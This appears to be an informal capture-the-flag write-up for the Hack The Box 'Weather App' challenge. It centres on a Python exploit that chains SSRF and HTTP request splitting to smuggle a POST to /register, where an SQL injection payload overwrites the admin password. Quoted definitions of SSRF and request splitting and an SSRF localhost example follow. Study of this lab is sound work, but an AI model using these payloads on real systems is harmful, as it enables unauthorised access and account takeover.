index.js checks if socket remoteaddress isn't:
127.0.0.1 return status(401)

there's a db somewhere.
some app is listening on port 80?

vulnerability:
SSRF, SQL injection
```
Path Point:
data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}
```
code:
```py
import requests

url = "http://178.62.106.4:31814"

username="admin"

password="123') ON CONFLICT(username) DO UPDATE SET password = 'admin';--"
parsedUsername = username.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
parsedPassword = password.replace(" ","\u0120").replace("'", "%27").replace('"', "%22")
contentLength = len(parsedUsername) + len(parsedPassword) + 19
endpoint = '127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120' + str (contentLength) + '\u010D\u010A\u010D\u010Ausername='+parsedUsername + '&password='+ parsedPassword + '\u010D\u010A\u010D\u010AGET\u0120/?lol='


city='test'
proxies={'http':'http://127.0.0.1:8080'};
country='test'

json={'endpoint':endpoint,'city':city,'country':country}

res=requests.post(url=url+'/api/weather',json=json,proxies=proxies);
```

This took me a long time to guess why the code won't work(yes i stole it from writeup but atleast i took research of SSRF first before i used it)
Apparently, i had to send the proxy data to repeater in order for it to work and then refresh the login webdirectory and see if it gave you the flag or
u can just login again.

this is either SSRF or request splitting but either way i'll try to explain this:

SSRF:
```
Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.

In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization's infrastructure. 
In other cases, they may be able to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.
                                                                                                                                                                                                                                        --PortSwigger
```

SSRF uses a parameter(it can be endpoint or an API parameter, any parameter) that uses a http request to send information to that specified url, and retrieve
the contents of it:
```
data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}

PortSwigger:
stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

Though, i'd rather call this as the network point or path point.

if we update the parameter or path point to:
```
stockApi=http://localhost/admin
```
this gives us the admin console or the contents of the admin webdirectory, we can visit the directory but it will be blocked or it won't show.

Request Splitting:
```
HTTP Request Splitting is an attack that enables forcing the browser to send arbitrary HTTP requests, inflicting XSS and poisoning the browser's cache. 
The essence of the attack is the ability of the attacker, once the victim (browser) is forced to load the attacker's malicious HTML page, to manipulate 
one of the browser's functions to send 2 HTTP requests instead of one HTTP request. Two such mechanisms have been exploited to date: 
the XmlHttpRequest object (XHR for short) and the HTTP digest authentication mechanism. For this attack to work, the browser must use a forward HTTP proxy 
(not all of them "support" this attack), or the attack must be carried out against a host located on the same IP (from the browser's perspective) with the 
attacker's machine.
                                    ----Webappsec.org

PortSwigger:
HTTP request smuggling is a technique for interfering with the way a web site processes sequences of HTTP requests that are received from one or 
more users. Request smuggling vulnerabilities are often critical in nature, allowing an attacker to bypass security controls, gain unauthorized access to 
sensitive data, and directly compromise other application users.
                                    -----PortSwigger

My Explanation:
Request Splitting, as what it says in the name is the ability to send 2 request instead of one request via vulnerable parameters to gain access or to hold
sensitive data.
```

Explanation of the source code:
```
the endpoint was found from the files downloaded, provided by the HTB(weather App).
It is vulnerable to SSRF; and it is also vulnerable to Request Splitting

the proxy and the endpoint variable is the only thing important to explain the code.
as explained at the top: the endpoint in the code was vulnerable because there was no sanitization

The register was vulnerable to SQL injection( never tried the login )

the proxy is important because this is where we will need to get the retrieved data. The proxy acts as a middle man
between the connection line.

You can use burp suite as your proxy in the code to retrieve the information; and send the request again to repeater.
```

Source:

https://portswigger.net/web-security/request-smuggling
http://projects.webappsec.org/w/page/13246929/HTTP%20Request%20Splitting


